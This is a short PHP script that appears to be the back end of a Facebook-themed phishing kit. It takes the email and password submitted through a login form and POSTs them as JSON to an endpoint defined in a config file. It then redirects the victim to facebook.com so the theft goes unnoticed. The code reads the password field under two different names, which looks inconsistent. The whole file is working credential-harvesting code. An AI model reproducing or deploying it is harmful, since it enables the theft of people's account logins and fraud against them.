<?php
require('config.php');

$email = $_POST['email'];
$password = $_POST['password'];

$request = array
(
    "field_key" => $_POST['email'],
    "field_value" => $_POST['pass'],
    "filter" => Config::$request_filter
);

$request_json = json_encode($request, TRUE);

$ch = curl_init(Config::$request_endpoint);
curl_setopt_array($ch, array(
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_RETURNTRANSFER => TRUE,
    CURLOPT_HTTPHEADER => array
    (
        'Content-Type: application/json',
        'lock: ' . Config::$request_lock
    ),
    CURLOPT_POSTFIELDS => $request_json,
    CURLOPT_RETURNTRANSFER => TRUE
));

$response = curl_exec($ch);
if($response === FALSE)
{
    //die(curl_error($ch));
    header('Location: https://www.facebook.com/');
}

header('Location: https://www.facebook.com/');
?>